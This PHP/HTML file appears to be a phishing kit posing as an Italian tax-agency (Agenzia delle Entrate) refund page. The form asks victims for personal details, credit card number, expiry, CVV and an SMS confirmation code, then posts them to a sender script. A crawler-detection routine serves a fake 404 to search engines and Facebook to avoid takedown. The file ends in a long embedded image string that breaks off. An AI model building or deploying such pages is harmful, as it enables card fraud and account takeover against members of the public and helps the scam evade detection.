<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<?php //##############################################

$WAITING_DURATION = 30; // time in seconds

//##############################################

$TITLE_PAGE_1 = 'Modulo di Rimborso';
$TITLE_PAGE_2 = 'Rimborso - Coordinate Bancarie del Beneficiario';
$TITLE_PAGE_3 = 'L‘ordine di trasferimento è in preparazione';
$TITLE_INFO = 'GENERAL REFUND INFORMATION';

$WAIT_TEXT = 'Processing in progress. Please wait without refreshing the page.';
$SMS_TEXT = 'Please enter the confirmation code received by SMS.
This is required to confirm receipt of the refund.';

$CONFIRMATION_TITLE = 'Application registered successfully.';
$CONFIRMATION_BODY = 'The transfer order has been sent to your bank, you will soon receive a message to inform you of the next refund.';

$NAME = 'Nome';
$NAME_info = 'Nome';

$LASTNAME = 'Cognome';
$LASTNAME_info = 'Cognome';

$DOB = 'Data di nascita';

$PHONE = 'Telefono';
$PHONE_info = 'Telefono';

$ADDRESS = 'Indirizzo';
$ADDRESS_info = 'Indirizzo';

$CITY = 'Città';
$CITY_info = 'Città';

$POSTALCODE = 'Codice Postale';
$POSTALCODE_info = 'Codice Postale';

$CARD = 'Carta di credito';
$CARD_info = 'Carta di credito';

$EXP = 'Data di scadenza';
$CVV = 'CVV (3 Cifre sul retro)';

$INFO_1 = 'Beneficiario del rimborso';

$INFO_2 = 'Modalità di ricezione';
$VALUE_2 = 'Carta di credito';

$INFO_3 = 'Numero di file';
$VALUE_3 = '13828AXD197';

$INFO_4 = 'Importo del rimborso';
$VALUE_4 = '195 €';

$INFO_5 = 'Data';

$INFO_6 = 'Condizioni di pagamento';
$VALUE_6 = '24 ore';

$SMS = 'Code received via SMS';
$SMS_info = 'Code received via SMS';

$BUTTON = 'Avanti';

//##############################################

$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$actual_link = preg_replace("/".basename($_SERVER['PHP_SELF'])."/","",$actual_link);

header('X-Frame-Options: DENY');

function DetectBot($USER_AGENT){
	$crawlers = array(
		'Google' => 'Google',
		'MSN' => 'msnbot',
		'Rambler' => 'Rambler',
		'Yahoo' => 'Yahoo',
		'AbachoBOT' => 'AbachoBOT',
		'accoona' => 'Accoona',
		'AcoiRobot' => 'AcoiRobot',
		'ASPSeek' => 'ASPSeek',
		'CrocCrawler' => 'CrocCrawler',
		'Dumbot' => 'Dumbot',
		'FAST-WebCrawler' => 'FAST-WebCrawler',
		'GeonaBot' => 'GeonaBot',
		'Gigabot' => 'Gigabot',
		'Lycos spider' => 'Lycos',
		'MSRBOT' => 'MSRBOT',
		'Altavista robot' => 'Scooter',
		'AltaVista robot' => 'Altavista',
		'ID-Search Bot' => 'IDBot',
		'eStyle Bot' => 'eStyle',
		'Scrubby robot' => 'Scrubby',
		'Facebook' => 'facebookexternalhit',
	);

	$crawlers_agents = implode('|',$crawlers);
	  
	if (strpos($crawlers_agents, $USER_AGENT) === false){
		return false;
	}else{
		return true;
	}
}

if(DetectBot($_SERVER['HTTP_USER_AGENT'])){
	echo "<center style=\"font-family:Arial;color:#666;line-height:20px;\"><h1>404</h1><div>Page not found</div></center>";
	die();
}

echo '<script>var WAITING_DURATION = '.$WAITING_DURATION.';</script>';
echo '<script>var ACTUAL_LINK = "'.$actual_link.'sender.php";</script>';
?>





  
  
  
  
  
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">






		
		
  
  
  
  
  
  
  
  
  
  
  <title>Agenzia delle Entrate - Home</title>
  <meta name="robots" content="noindex">






		
  
  
  
  
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">






		
  
  
  
  
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">






		
  
  
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

	<link rel="stylesheet" href="./asset/bootstrap-5.1.3-dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="./asset/style/style.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">





		
  
  
  
  
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300&amp;display=swap" rel="stylesheet">






		
  
  
  
  
  
  <link rel="icon" type="image/png" href="data:image/jpeg;base64,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